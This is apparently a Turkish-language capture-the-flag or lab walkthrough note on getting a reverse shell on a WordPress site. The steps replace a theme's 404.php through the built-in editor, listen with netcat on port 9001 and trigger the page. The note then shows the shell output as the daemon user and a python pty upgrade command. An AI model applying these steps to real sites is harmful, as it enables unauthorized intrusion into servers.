
Appearance/Editör dizinine giderek Wordpress içerisinde mevcut olan sayfalarımız da değişiklik yapabiliyoruz.
Mevcut bir sayfada kaynak kodu .php reverse shell kodlarımızla değiştirerek reverse shell alacağız. 

![[Wordpress shell.png]]

Sayfayı kaydetim netcat aracımız ile 9001 portumuzu dinlemeye başlıyoruz. 

Url adresimize istek gönderdiğimizde reverse shell kodumuz çalıştı ve shell aldık .

```
http://10.10.55.194/wp-content/themes/twentyfifteen/404.php
```

```
└──╼ #nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.11.106.146] from (UNKNOWN) [10.10.55.194] 35035
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 16:51:22 up  2:13,  0 users,  load average: 0.15, 0.11, 0.16
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
sh: 0: can't access tty; job control turned off
$ whoami
daemon
```

Kabuğu çalıştırmak için 

```
python -c "import pty;pty.spawn('/bin/bash');"
```

```
$ python -c "import pty;pty.spawn('/bin/bash');"
daemon@linux:/$ 
```